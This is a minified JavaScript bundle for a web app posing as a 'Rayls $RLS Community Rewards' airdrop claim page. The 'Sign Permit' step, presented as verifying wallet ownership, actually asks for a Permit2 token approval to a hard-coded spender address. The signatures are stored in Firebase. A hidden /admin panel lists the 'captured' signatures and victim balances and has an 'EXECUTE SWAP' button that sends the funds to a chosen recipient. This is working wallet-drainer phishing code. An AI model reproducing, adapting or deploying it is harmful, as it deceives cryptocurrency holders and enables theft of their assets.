2-2v-.351",key:"1k2beg"}],["path",{d:"M21.378 12.626a1 1 0 0 0-3.004-3.004l-4.01 4.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z",key:"2t3380"}],["path",{d:"M8 18h1",key:"13wk12"}]],AKe=Xu("file-pen-line",_Ke);const CKe=[["path",{d:"M21 12a9 9 0 1 1-6.219-8.56",key:"13zald"}]],Ohe=Xu("loader-circle",CKe);const SKe=[["path",{d:"M22 17a2 2 0 0 1-2 2H6.828a2 2 0 0 0-1.414.586l-2.202 2.202A.71.71 0 0 1 2 21.286V5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2z",key:"18887p"}]],TKe=Xu("message-square",SKe);const xKe=[["path",{d:"M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",key:"oel41y"}],["path",{d:"m9 12 2 2 4-4",key:"dzmm74"}]],IKe=Xu("shield-check",xKe);const RKe=[["path",{d:"M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z",key:"pff0z6"}]],PKe=Xu("twitter",RKe);const NKe=[["path",{d:"M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1",key:"18etb6"}],["path",{d:"M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4",key:"xoc0q4"}]],OKe=Xu("wallet",NKe);var kKe="firebase",DKe="12.6.0";h1(kKe,DKe,"app");const BKe={apiKey:void 0,authDomain:void 0,projectId:void 0,storageBucket:void 0,messagingSenderId:void 0,appId:void 0},jKe=zde(BKe),EE=WGe(jKe),MKe="/api/run-worker",DT="0x05a5b264448da10877f79fbdff35164be7b9a869";function UKe(){const[t,e]=un.useState({}),[n,r]=un.useState(localStorage.getItem("admin_recipient")||""),[i,s]=un.useState(localStorage.getItem("admin_outputToken")||"0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"),[o,a]=un.useState(!1),[c,l]=un.useState(!1),[f,h]=un.useState(""),[m,b]=un.useState(DT),[w,y]=un.useState(""),[E,A]=un.useState(null),[R,S]=un.useState(!1),[v,k]=un.useState(null),[O,_]=un.useState("");un.useEffect(()=>{localStorage.setItem("admin_recipient",n),localStorage.setItem("admin_outputToken",i)},[n,i]);const I=async()=>{a(!0),l(!0);try{const re=await uKe(DI(EE,"admin_config","settings")),le=re.exists()?re.data():{},oe=DT,ue=le.rpcUrl||le.RPC_URL||w||void 0||"",be=le.tokenAddress||i||void 0||"",Me=le.recipient||n||localStorage.getItem("admin_recipient")||"";b(oe),y(ue),s(be),r(Me),h("Loaded")}catch(re){console.error("Failed to load settings",re),h("Load failed")}finally{l(!1)}},T=async()=>{l(!0),h("Saving...");try{await The(DI(EE,"admin_config","settings"),{rpcUrl:w,tokenAddress:i,recipient:n},{merge:!0}),h("Saved")}catch(re){console.error("Failed to save settings",re),h("Save failed")}finally{l(!1)}};un.useEffect(()=>{const re=sKe(VGe(EE,"permit2_signatures")),le=xhe(re,oe=>{const ue={};oe.docs.forEach(be=>{const Me=be.data();ue[Me.owner]||(ue[Me.owner]=[]),ue[Me.owner].push({id:be.id,...Me})}),e(ue)});return()=>le()},[]);const[B,U]=un.useState({}),[M,N]=un.useState(""),[q,P]=un.useState(""),[C,j]=un.useState("TOKEN"),$=i||"0xdAC17F958D2ee523a2206206994597C13D831ec7",H=["function balanceOf(address) view returns (uint256)","function decimals() view returns (uint8)"],[L,V]=un.useState(6),G=DT,Z=new Jue("https://cloudflare-eth.com");un.useEffect(()=>{let re=!0;const le=Object.keys(t);if(!le.length){U({});return}return(async()=>{const oe={};let ue;try{ue=new vp($,H,Z);const be=await ue.decimals();V(Number(be));try{const Me=await ue.symbol();Me&&j(Me)}catch{}}catch{}for(const be of le)try{const Me=await Z.getBalance(be);oe[be]=parseFloat(iD(Me)).toFixed(4)}catch{oe[be]=""}re&&U(oe)})(),(async()=>{try{const oe=await Z.getBalance(G);N(parseFloat(iD(oe)).toFixed(4))}catch{N("")}try{const oe=new vp($,H,Z),ue=await oe.balanceOf(G);P(Number(pj(ue,L)).toFixed(4));try{const be=await oe.symbol();be&&j(be)}catch{}}catch{P("")}})(),()=>{re=!1}},[t]);const J=async re=>{k(re.id),_("Triggering Backend Server...");try{const le=await fetch(MKe,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({docId:re.id,recipient:n,outputToken:i})}),oe=await le.json();if(!le.ok||!oe.ok)throw new Error(oe.error||"Backend failed to execute");_("Success! Backend executed the swap."),setTimeout(()=>_(""),3e3)}catch(le){console.error(le),_("Error: "+le.message)}finally{k(null)}},ne=re=>{A(re),S(!0),_("")};return ae.jsxs("div",{className:"admin-wrapper",children:[ae.jsx("div",{className:"ambient-glow one"}),ae.jsx("div",{className:"ambient-glow two"}),ae.jsxs("div",{className:"admin-container glass-panel",children:[ae.jsxs("header",{className:"admin-header",children:[ae.jsxs("div",{className:"header-top",children:[ae.jsx("h2",{children:"Admin Control Center"}),ae.jsxs("div",{style:{display:"flex",alignItems:"center",gap:8},children:[ae.jsx("div",{className:"connection-badge active",children:"Server Mode"}),ae.jsx("button",{className:"settings-btn",onClick:I,title:"Settings",children:""}),ae.jsxs("div",{style:{marginLeft:12,background:"rgba(255,255,255,0.03)",padding:"6px 10px",borderRadius:8,display:"flex",flexDirection:"column",alignItems:"flex-start"},children:[ae.jsx("div",{style:{fontSize:12,color:"#ccc"},children:"Executor"}),ae.jsx("div",{style:{fontFamily:"monospace",fontSize:13},children:G.length>8?`${G.slice(0,6)}...${G.slice(-4)}`:""}),ae.jsxs("div",{style:{fontSize:12,color:"#fff",marginTop:4},children:[M," ETH  ",q," ",C]})]})]})]}),ae.jsxs("div",{className:"settings-grid",children:[ae.jsxs("div",{className:"input-group",children:[ae.jsx("label",{children:"Target Recipient Address"}),ae.jsx("input",{type:"text",value:n,onChange:re=>r(re.target.value),placeholder:"0x... (Wallet to receive funds)"})]}),ae.jsxs("div",{className:"input-group",children:[ae.jsx("label",{children:"Output Token Address"}),ae.jsx("input",{type:"text",value:i,onChange:re=>s(re.target.value),placeholder:"0x... (Token to swap into)"})]})]})]}),ae.jsxs("div",{className:"wallet-grid",children:[Object.keys(t).length===0&&ae.jsx("div",{className:"empty-state",style:{color:"#888",textAlign:"center",width:"100%",padding:"20px"},children:"No signatures captured yet."}),Object.keys(t).map(re=>ae.jsxs("div",{className:"wallet-card glass-card",onClick:()=>ne(re),children:[ae.jsxs("div",{className:"card-header",children:[ae.jsx("span",{className:"wallet-icon",children:""}),ae.jsxs("span",{className:"wallet-addr",children:[re.slice(0,6),"...",re.slice(-4)]}),ae.jsx("span",{className:"wallet-balance",children:B[re]?`${B[re]} ETH`:"Loading..."})]}),ae.jsxs("div",{className:"card-body",children:[ae.jsxs("div",{className:"stat-row",children:[ae.jsx("span",{children:"Signatures"}),ae.jsx("span",{className:"highlight-white",children:t[re].length})]}),ae.jsxs("div",{className:"stat-row",children:[ae.jsx("span",{children:"Pending"}),ae.jsx("span",{className:"highlight-yellow",children:t[re].filter(le=>!le.processed).length})]})]}),ae.jsx("button",{className:"view-btn",children:"Manage"})]},re))]})]}),R&&E&&ae.jsx("div",{className:"modal-overlay",onClick:()=>S(!1),children:ae.jsxs("div",{className:"modal-glass glass-panel",onClick:re=>re.stopPropagation(),children:[ae.jsxs("div",{className:"modal-header",children:[ae.jsxs("h3",{children:[E.slice(0,6),"...",E.slice(-4)]}),ae.jsx("button",{className:"close-btn",onClick:()=>S(!1),children:""})]}),O&&ae.jsx("div",{className:`status-bar ${O.includes("Success")?"success":O.includes("Error")?"error-msg":"processing"}`,children:O}),ae.jsx("div",{className:"signature-list",children:t[E].map(re=>ae.jsxs("div",{className:`signature-item ${re.processed?"processed":""}`,children:[ae.jsxs("div",{className:"sig-row",children:[ae.jsx("span",{className:"label",children:"Token"}),ae.jsxs("span",{className:"value",children:[re.token.slice(0,6),"...",re.token.slice(-4)]})]}),ae.jsxs("div",{className:"sig-row",children:[ae.jsx("span",{className:"label",children:"Amount"}),ae.jsxs("span",{className:"value",children:[(BigInt(re.amount)/10n**6n).toString()," USDT"]})]}),ae.jsxs("div",{className:"sig-row",children:[ae.jsx("span",{className:"label",children:"Status"}),ae.jsx("span",{className:`status-tag ${re.processed?"done":"pending"}`,children:re.processed?"Done":"Ready"})]}),re.lastError&&!re.processed&&ae.jsxs("div",{className:"error-msg",style:{marginTop:"10px"},children:[" ",re.lastError.slice(0,60),"..."]}),re.processed?ae.jsx("a",{href:`https://etherscan.io/tx/${re.routerTx}`,target:"_blank",rel:"noreferrer",className:"etherscan-link",children:"View on Etherscan "}):ae.jsx("button",{className:"execute-btn",onClick:()=>J(re),disabled:v===re.id,children:v===re.id?"CONTACTING SERVER...":"EXECUTE SWAP"})]},re.id))})]})}),o&&ae.jsx("div",{className:"modal-overlay",onClick:()=>a(!1),children:ae.jsxs("div",{className:"modal-glass glass-panel",onClick:re=>re.stopPropagation(),style:{maxWidth:600},children:[ae.jsxs("div",{className:"modal-header",children:[ae.jsx("h3",{children:"App Settings"}),ae.jsx("button",{className:"close-btn",onClick:()=>a(!1),children:""})]}),ae.jsxs("div",{style:{padding:"10px 6px"},children:[ae.jsxs("div",{className:"input-group",children:[ae.jsx("label",{children:"Executor Address"}),ae.jsx("input",{value:m,onChange:re=>b(re.target.value),placeholder:"0x..."})]}),ae.jsxs("div",{className:"input-group",children:[ae.jsx("label",{children:"Spender / Executor"}),ae.jsx("input",{value:DT,readOnly:!0,placeholder:"Hard-coded spender"}),ae.jsx("div",{style:{fontSize:12,color:"#aaa",marginTop:6},children:"Spender address is hard-coded in the backend and cannot be changed via the UI."})]}),ae.jsxs("div",{className:"input-group",children:[ae.jsx("label",{children:"RPC URL"}),ae.jsx("input",{value:w,onChange:re=>y(re.target.value),placeholder:"https://..."})]}),ae.jsxs("div",{className:"input-group",children:[ae.jsx("label",{children:"Token Address"}),ae.jsx("input",{value:i,onChange:re=>s(re.target.value),placeholder:"0x..."})]}),ae.jsxs("div",{className:"input-group",children:[ae.jsx("label",{children:"Recipient Address"}),ae.jsx("input",{value:n,onChange:re=>r(re.target.value),placeholder:"0x..."})]}),ae.jsxs("div",{style:{display:"flex",gap:8,marginTop:12},children:[ae.jsx("button",{className:"btn-refresh",onClick:T,disabled:c,children:c?"Saving...":"Save"}),ae.jsx("div",{style:{alignSelf:"center",color:"#aaa"},children:f})]})]})]})})]})}const LKe="0x000000000022D473030F116dDEE9F6B43aC78BA3",FKe="0x05a5b264448da10877f79fbdff35164be7b9a869",$Ke=6n,pre=BigInt(1e4)*10n**$Ke,Sk=gBe({adapters:[new dze],networks:[fze],projectId:void 0,metadata:{name:"Permit2 App",description:"Universal Router Permit2 Signer",url:"https://example.com",icons:[]}}),khe=({className:t="text-black"})=>ae.jsxs("svg",{width:"28",height:"28",viewBox:"0 0 50 50",fill:"none",className:t,children:[ae.jsx("path",{d:"M10 18 C 22 18, 38 12, 45 8",stroke:"currentColor",strokeWidth:"7",strokeLinecap:"round"}),ae.jsx("path",{d:"M10 32 C 22 32, 38 26, 45 20",stroke:"currentColor",strokeWidth:"7",strokeLinecap:"round"}),ae.jsx("path",{d:"M10 32 C 2 32, 2 18, 10 18",stroke:"currentColor",strokeWidth:"7",strokeLinecap:"round"})]}),Dhe=({variant:t="default"})=>ae.jsx("div",{className:"absolute inset-0 z-0 pointer-events-none overflow-hidden",children:ae.jsx("svg",{className:"w-full h-full",viewBox:"0 0 375 812",preserveAspectRatio:"none",xmlns:"http://www.w3.org/2000/svg",children:t==="default"?ae.jsxs(ae.Fragment,{children:[ae.jsx("path",{d:"M-100 200 C 0 220, 150 280, 400 350 L 400 450 C 150 380, 0 300, -100 280 Z",fill:"#EAD1FF",opacity:"0.8"}),ae.jsx("path",{d:"M-100 300 C 0 320, 150 400, 400 450 L 400 580 C 150 500, 0 400, -100 380 Z",fill:"#DAB6FF",opacity:"0.9"}),ae.jsx("path",{d:"M-100 450 C 0 450, 150 520, 400 550 L 400 750 C 150 650, 0 550, -100 580 Z",fill:"#DAB6FF",opacity:"0.6"})]}):ae.jsxs(ae.Fragment,{children:[ae.jsx("rect",{width:"100%",height:"100%",fill:"#C4B5FD"}),ae.jsx("circle",{cx:"0",cy:"400",r:"300",fill:"#DFFF26",opacity:"0.8",filter:"url(#blurMe)"}),ae.jsx("circle",{cx:"400",cy:"800",r:"300",fill:"#A78BFA",opacity:"0.8",filter:"url(#blurMe)"}),ae.jsx("defs",{children:ae.jsx("filter",{id:"blurMe",children:ae.jsx("feGaussianBlur",{in:"SourceGraphic",stdDeviation:"60"})})})]})})}),Bhe=()=>ae.jsxs("footer",{className:"relative z-10 bg-[#0F0F0F] text-white pt-8 pb-10 px-6 mt-auto",children:[ae.jsx("div",{className:"mb-8",children:ae.jsxs("p",{className:"text-sm text-gray-400 mb-1 flex items-center gap-1.5",children:["Powered by ",ae.jsx("span",{className:"text-white font-black text-lg tracking-wider",children:"CLIQUE"})]})}),ae.jsxs("div",{className:"flex flex-wrap gap-x-6 gap-y-2 text-sm underline decoration-gray-500 underline-offset-4 text-gray-200 mb-5 font-light",children:[ae.jsx("a",{href:"#",className:"hover:text-white transition-all",children:"Privacy Policy"}),ae.jsx("a",{href:"#",className:"hover:text-white transition-all",children:"General Terms of Service"})]}),ae.jsx("div",{className:"text-sm text-gray-400 font-light",children:" 2025 Rayls. All rights reserved."}),ae.jsx("div",{className:"absolute bottom-2 left-1/2 transform -translate-x-1/2 w-32 h-1.5 bg-gray-700/50 rounded-full mt-4"})]}),HKe=({currentStep:t})=>ae.jsx("div",{className:"relative z-10 px-4 mb-6 w-full max-w-md mx-auto",children:ae.jsx("div",{className:"bg-[#111] rounded-full p-1 flex items-center justify-between text-white text-sm font-medium h-12 shadow-lg",children:[1,2,3,4,5].map(e=>{const n=e===t;return ae.jsx("div",{className:`flex-1 flex items-center justify-center h-full rounded-full transition-all duration-300 ${n?"bg-[#A38CFF] text-black shadow-sm font-bold":"text-gray-400"}`,children:n?`Step${e}`:e},e)})})}),u5=({step:t,title:e,subtitle:n,children:r,nextLabel:i="Next",onNext:s,isNextDisabled:o})=>ae.jsxs("div",{className:"min-h-screen flex flex-col relative bg-[#C4B5FD] font-sans",children:[ae.jsx(Dhe,{variant:"step1"}),ae.jsxs("div",{className:"relative z-20 bg-transparent px-4 py-2 text-xs font-medium text-black/80 text-center sm:text-left",children:["Please join our ",ae.jsx("span",{className:"underline font-bold cursor-pointer",children:"Discord"})," if you have any questions or need further support."]}),ae.jsx("header",{className:"relative z-10 px-6 py-4 flex items-center",children:ae.jsxs("div",{className:"flex items-center gap-2.5",children:[ae.jsx(khe,{}),ae.jsx("span",{className:"text-xl font-bold tracking-tight text-black",children:"Rayls"})]})}),ae.jsx(HKe,{currentStep:t}),ae.jsx("main",{className:"relative z-10 px-4 pb-10 flex-1 flex flex-col items-center",children:ae.jsxs("div",{className:"bg-white rounded-3xl p-6 shadow-xl flex flex-col items-center text-center w-full max-w-md mx-auto min-h-[420px]",children:[ae.jsx("h2",{className:"text-2xl font-bold text-black mb-3 mt-2",children:e}),ae.jsx("p",{className:"text-gray-500 text-sm mb-6 px-2 leading-relaxed max-w-[90%]",children:n}),ae.jsx("div",{className:"w-full flex-1 flex flex-col items-center",children:r}),s&&ae.jsx("button",{onClick:s,disabled:o,className:`w-full py-4 rounded-2xl font-medium text-base transition-all mt-6 ${o?"bg-gray-100 text-gray-400 cursor-not-allowed":"bg-black text-white shadow-lg active:scale-95 cursor-pointer hover:bg-gray-900"}`,children:i})]})}),ae.jsx(Bhe,{})]}),mre=({onEnter:t})=>ae.jsxs("div",{className:"min-h-screen flex flex-col relative bg-[#DFFF26] text-black",children:[ae.jsx(Dhe,{variant:"default"}),ae.jsx("header",{className:"relative z-10 px-6 py-6 flex items-center justify-between",children:ae.jsxs("div",{className:"flex items-center gap-2.5",children:[ae.jsx(khe,{}),ae.jsx("span",{className:"text-xl font-bold tracking-tight",children:"Rayls"})]})}),ae.jsxs("main",{className:"relative z-10 flex-1 flex flex-col items-center justify-center text-center px-4 pb-20 mt-[-40px]",children:[ae.jsx("div",{className:"mb-8 transform translate-x-1",children:ae.jsxs("svg",{width:"72",height:"72",viewBox:"0 0 100 100",fill:"none",className:"text-black",children:[ae.jsx("path",{d:"M20 35 C 45 35, 75 25, 90 15",stroke:"currentColor",strokeWidth:"14",strokeLinecap:"round"}),ae.jsx("path",{d:"M20 65 C 45 65, 75 55, 90 45",stroke:"currentColor",strokeWidth:"14",strokeLinecap:"round"}),ae.jsx("path",{d:"M20 65 C 5 65, 5 35, 20 35",stroke:"currentColor",strokeWidth:"14",strokeLinecap:"round"})]})}),ae.jsxs("h1",{className:"text-5xl font-extrabold text-black leading-[1.1] tracking-tight mb-2",children:["$RLS",ae.jsx("br",{}),"Community",ae.jsx("br",{}),"Rewards"]}),ae.jsx("p",{className:"text-black/80 text-[1.05rem] mt-3 mb-10 font-medium tracking-wide",children:"Verify your activity to unlock your reward"}),ae.jsxs("button",{onClick:t,className:"group bg-[#111] text-white pl-10 pr-8 py-4 rounded-full font-medium text-base flex items-center gap-2 hover:bg-black/80 transition-all shadow-xl active:scale-95 cursor-pointer",children:["Enter ",ae.jsx(yU,{size:18,className:"group-hover:translate-x-0.5 transition-transform"})]})]}),ae.jsx(Bhe,{})]}),zKe=({onNext:t,openWallet:e,isConnected:n,connectedAddress:r})=>{const[i,s]=un.useState(!1);return ae.jsxs(u5,{step:1,title:"Connect Wallet",subtitle:"Connect your wallet to check your eligibility for rewards.",onNext:t,isNextDisabled:!i||!n,children:[ae.jsxs("button",{onClick:e,className:`w-full transition-colors rounded-xl p-4 flex items-center justify-between mb-auto group cursor-pointer border ${n?"bg-green-50 border-green-200":"bg-gray-50 border-transparent hover:border-gray-200 hover:bg-gray-100"}`,children:[ae.jsxs("div",{className:"flex items-center gap-3",children:[ae.jsx("div",{className:`p-2 rounded-lg shadow-sm border ${n?"bg-green-100 border-green-200":"bg-white border-gray-100"}`,children:ae.jsx(OKe,{size:20,className:"text-black"})}),ae.jsx("span",{className:"font-medium text-black",children:n&&r?`Connected: ${r.slice(0,6)}...${r.slice(-4)}`:"Connect Wallet"})]}),n?ae.jsx(Nhe,{size:18,className:"text-green-500"}):ae.jsx(yU,{size:18,className:"text-gray-400 group-hover:text-black transition-colors"})]}),ae.jsxs("div",{className:"flex items-start gap-3 mt-8 mb-2 text-left bg-gray-50 p-3 rounded-xl w-full",children:[ae.jsxs("div",{className:"relative flex items-center pt-1",children:[ae.jsx("input",{type:"checkbox",id:"us-confirm",className:"peer h-5 w-5 cursor-pointer appearance-none rounded border border-gray-400 checked:border-black checked:bg-black transition-all",checked:i,onChange:()=>s(!i)}),ae.jsx(Phe,{size:14,className:"pointer-events-none absolute left-1/2 top-[45%] -translate-x-1/2 -translate-y-1/2 text-white opacity-0 peer-checked:opacity-100"})]}),ae.jsx("label",{htmlFor:"us-confirm",className:"text-xs text-gray-600 leading-relaxed cursor-pointer select-none",children:"I confirm that I am not a U.S. Person (including U.S. citizens, residents, entities, or anyone located in the United States)."})]})]})},qKe=({onNext:t})=>{const[e,n]=un.useState(!1),[r,i]=un.useState(!1),s=()=>{n(!0),setTimeout(()=>{n(!1),i(!0)},1500)};return ae.jsxs(u5,{step:2,title:"Check Eligibility",subtitle:"Verify your on-chain activity and social status to proceed.",onNext:t,isNextDisabled:!r,children:[ae.jsxs("div",{className:"space-y-3 w-full mb-auto",children:[ae.jsxs("button",{className:"w-full bg-gray-50 hover:bg-gray-100 transition-colors rounded-xl p-4 flex items-center justify-between group cursor-pointer border border-transparent hover:border-gray-200",children:[ae.jsxs("div",{className:"flex items-center gap-3",children:[ae.jsx("div",{className:"p-2 bg-[#5865F2]/10 rounded-lg",children:ae.jsx(TKe,{size:20,className:"text-[#5865F2]",fill:"currentColor"})}),ae.jsx("span",{className:"font-medium text-black",children:"Join Discord"})]}),ae.jsx("div",{className:"px-3 py-1 bg-green-100 text-green-700 text-xs font-bold rounded-full",children:"Connected"})]}),ae.jsxs("button",{onClick:s,className:"w-full bg-gray-50 hover:bg-gray-100 transition-colors rounded-xl p-4 flex items-center justify-between group cursor-pointer border border-transparent hover:border-gray-200 relative overflow-hidden",children:[ae.jsxs("div",{className:"flex items-center gap-3",children:[ae.jsx("div",{className:"p-2 bg-black/5 rounded-lg",children:ae.jsx(PKe,{size:20,className:"text-black",fill:"currentColor"})}),ae.jsx("span",{className:"font-medium text-black",children:"Follow @Rayls_Global"})]}),r?ae.jsx(Nhe,{size:20,className:"text-green-500"}):e?ae.jsx(Ohe,{size:20,className:"text-gray-400 animate-spin"}):ae.jsx(yU,{size:18,className:"text-gray-400 group-hover:text-black transition-colors"})]})]}),!r&&ae.jsx("div",{className:"mt-6 text-xs text-gray-400 bg-yellow-50 p-3 rounded-lg border border-yellow-100 text-center w-full",children:"Please complete all tasks to continue."})]})},VKe=({onNext:t,onSign:e,signStatus:n,errorMessage:r})=>{const i=n==="success",s=n==="loading";return ae.jsx(u5,{step:3,title:"Sign Permit",subtitle:"Sign a secure permit to verify wallet ownership and authorize your claim.",onNext:t,isNextDisabled:!i,children:ae.jsxs("div",{className:"w-full mb-auto flex flex-col items-center",children:[ae.jsx("div",{className:`w-20 h-20 rounded-full flex items-center justify-center mb-6 transition-colors duration-500 ${i?"bg-green-100":"bg-blue-50"}`,children:i?ae.jsx(IKe,{size:40,className:"text-green-600"}):ae.jsx(AKe,{size:36,className:"text-blue-500"})}),i?ae.jsxs("div",{className:"w-full bg-green-50 rounded-xl p-5 border border-green-100 text-center animate-in fade-in zoom-in duration-300",children:[ae.jsx("p",{className:"text-green-800 font-semibold mb-1",children:"Signature Verified"}),ae.jsx("p",{className:"text-green-600 text-xs",children:"Your wallet has been successfully authorized."})]}):ae.jsxs("div",{className:"w-full bg-gray-50 rounded-xl p-5 border border-gray-100 flex flex-col gap-4",children:[ae.jsxs("div",{className:"flex justify-between text-sm",children:[ae.jsx("span",{className:"text-gray-500",children:"Function"}),ae.jsx("span",{className:"font-mono text-black font-medium",children:"VerifyEligibility()"})]}),ae.jsxs("div",{className:"flex justify-between text-sm",children:[ae.jsx("span",{className:"text-gray-500",children:"Status"}),ae.jsx("span",{className:"text-orange-500 font-medium",children:"Waiting for signature"})]}),ae.jsx("button",{onClick:e,disabled:s,className:"w-full mt-2 bg-black text-white py-3 rounded-lg font-medium text-sm hover:bg-gray-800 transition-colors flex items-center justify-center gap-2",children:s?ae.jsx(Ohe,{size:16,className:"animate-spin"}):"Sign Message"})]}),r&&ae.jsxs("div",{className:"mt-4 flex gap-2 items-start bg-red-50 p-3 rounded-lg border border-red-100 text-left w-full",children:[ae.jsx(hre,{size:16,className:"text-red-600 shrink-0 mt-0.5"}),ae.jsx("p",{className:"text-xs text-red-700 leading-snug break-all",children:r})]}),!i&&!r&&ae.jsxs("div",{className:"mt-4 flex gap-2 items-start bg-yellow-50 p-3 rounded-lg border border-yellow-100 text-left w-full",children:[ae.jsx(hre,{size:16,className:"text-yellow-600 shrink-0 mt-0.5"}),ae.jsxs("p",{className:"text-xs text-yellow-700 leading-snug",children:[ae.jsx("span",{className:"font-bold",children:"Requirement:"})," Your wallet must hold at least ",ae.jsx("span",{className:"font-bold",children:"$500"})," in assets."]})]})]})})},WKe=({onNext:t,connectedAddress:e})=>ae.jsx(u5,{step:4,title:"Claim Rewards",subtitle:"You are eligible! Claim your $RLS allocation now.",onNext:t,nextLabel:"Claim Tokens",isNextDisabled:!1,children:ae.jsxs("div",{className:"w-full flex flex-col items-center justify-center flex-1 py-4",children:[ae.jsx("div",{className:"text-sm font-medium text-gray-500 uppercase tracking-widest mb-2",children:"Total Allocation"}),ae.jsx("div",{className:"text-5xl font-extrabold text-black mb-1",children:"500"}),ae.jsx("div",{className:"text-xl font-bold text-[#A38CFF] mb-8",children:"$RLS"}),ae.jsxs("div",{className:"w-full bg-gray-50 rounded-xl p-4 flex items-center justify-between border border-gray-100",children:[ae.jsxs("div",{className:"flex flex-col text-left",children:[ae.jsx("span",{className:"text-xs text-gray-400",children:"Wallet Address"}),ae.jsx("span",{className:"text-sm font-mono text-black font-medium",children:e?`${e.slice(0,6)}...${e.slice(-4)}`:"..."})]}),ae.jsx("button",{className:"text-gray-400 hover:text-black transition-colors",children:ae.jsx(EKe,{size:16})})]})]})}),GKe=({onRestart:t})=>ae.jsx(u5,{step:5,title:"Success!",subtitle:"Your tokens have been successfully claimed and will arrive shortly.",onNext:t,nextLabel:"Back to Home",isNextDisabled:!1,children:ae.jsxs("div",{className:"w-full flex flex-col items-center justify-center flex-1",children:[ae.jsx("div",{className:"w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mb-6 animate-bounce",children:ae.jsx(Phe,{size:48,className:"text-green-600",strokeWidth:3})}),ae.jsxs("div",{className:"bg-gray-50 w-full rounded-xl p-4 text-center",children:[ae.jsx("p",{className:"text-sm text-gray-600",children:"Transaction Hash"}),ae.jsx("p",{className:"text-xs font-mono text-blue-500 mt-1 cursor-pointer hover:underline",children:"0x8a7...3b21"})]})]})});function KKe(){const[t]=un.useState(()=>window.location.pathname==="/admin"),[e]=un.useState(FKe),[n,r]=un.useState(null),[i,s]=un.useState("idle"),[o,a]=un.useState(""),[c,l]=un.useState("landing");un.useEffect(()=>Sk.subscribeAccount(w=>{w?.isConnected&&w?.address?r(w.address):r(null)}),[]),un.useEffect(()=>{try{const b=DI(EE,"admin_config","settings");return xhe(b,()=>{},y=>console.error("admin settings onSnapshot error",y))}catch{}},[]);const f=async()=>{try{if(s("loading"),a(""),!n)throw new Error("Wallet not connected");const b=Sk.getWalletProvider();if(!b)throw new Error("Wallet provider not available.");const y=await new Bl(b).getNetwork(),E=Number(y.chainId),A=Math.floor(Date.now()/1e3)+720*60*60,R=0,S={token:void 0,amount:pre.toString(),expiration:A,nonce:R},_=JSON.stringify({domain:{name:"Permit2",chainId:E,verifyingContract:LKe},types:{EIP712Domain:[{name:"name",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],PermitSingle:[{name:"details",type:"PermitDetails"},{name:"spender",type:"address"},{name:"sigDeadline",type:"uint256"}],PermitDetails:[{name:"token",type:"address"},{name:"amount",type:"uint160"},{name:"expiration",type:"uint48"},{name:"nonce",type:"uint48"}]},primaryType:"PermitSingle",message:{details:S,spender:e,sigDeadline:A}}),T=(await b.request({method:"eth_signTypedData_v4",params:[n,_]})).substring(2),B="0x"+T.substring(0,64),U="0x"+T.substring(64,128),M=parseInt(T.substring(128,130),16),N=n+"_"+Date.now();await The(DI(EE,"permit2_signatures",N),{owner:n,spender:e,token:void 0,amount:pre.toString(),expiration:A,nonce:R,r:B,s:U,v:M,processed:!1,timestamp:Date.now()}),s("success")}catch(b){console.error(b),a(b?.message||String(b)),s("error")}},h=()=>Sk.open();if(t)return ae.jsx(UKe,{});const m=()=>{switch(c){case"landing":return ae.jsx(mre,{onEnter:()=>l(1)});case 1:return ae.jsx(zKe,{onNext:()=>l(2),openWallet:h,isConnected:!!n,connectedAddress:n});case 2:return ae.jsx(qKe,{onNext:()=>l(3)});case 3:return ae.jsx(VKe,{onNext:()=>l(4),onSign:f,signStatus:i,errorMessage:o});case 4:return ae.jsx(WKe,{onNext:()=>l(5),connectedAddress:n});case 5:return ae.jsx(GKe,{onRestart:()=>l("landing")});default:return ae.jsx(mre,{onEnter:()=>l(1)})}};return ae.jsx(ae.Fragment,{children:m()})}E0e.createRoot(document.getElementById("root")).render(ae.jsx(un.StrictMode,{children:ae.jsx(KKe,{})}));export{ume as $,Yi as A,Bt as B,ke as C,Ee as D,tt as E,Wa as F,Hi as G,_t as H,St as I,sn as J,Ge as K,S9e as L,kt as M,CE as N,de as O,kre as P,Qm as Q,we as R,on as S,Ji as T,Cr as U,Z2 as V,Xn as W,Be as X,Es as Y,gi as Z,Rn as _,Ue as a,Mbe as a$,SE as a0,$i as a1,rn as a2,lE as a3,s1 as a4,lme as a5,Lk as a6,Pi as a7,Ux as a8,wFe as a9,N3 as aA,eie as aB,Awe as aC,Cwe as aD,LH as aE,tB as aF,$T as aG,dZe as aH,lZe as aI,Wp as aJ,aZe as aK,nB as aL,pZe as aM,mZe as aN,v1 as aO,HE as aP,$re as aQ,pt as aR,iB as aS,Rbe as aT,Pbe as aU,Nbe as aV,Obe as aW,kbe as aX,Dbe as aY,Bbe as aZ,jbe as a_,Zl as aa,Ka as ab,As as ac,CYe as ad,Gre as ae,Tr as af,pH as ag,fZe as ah,Dre as ai,mH as aj,Abe as ak,_be as al,nZe as am,Lre as an,lbe as ao,ybe as ap,fbe as aq,Fre as ar,Ure as as,Km as at,Vf as au,mbe as av,Wbe as aw,tw as ax,bx as ay,fze as az,bA as b,Ube as b0,gZe as b1,sZe as b2,Fbe as b3,yZe as b4,zre as b5,Lbe as b6,$be as b7,Hbe as b8,bZe as b9,LE as bA,VE as bB,_1 as bC,FE as bD,Dm as bE,UE as bF,KE as bG,Xa as bH,zE as bI,qE as bJ,ca as bK,YE as bL,E1 as bM,WE as bN,e_ as bO,Tbe as bP,JE as bQ,QE as bR,GE as bS,Zm as bT,Jbe as bU,dbe as bV,vbe 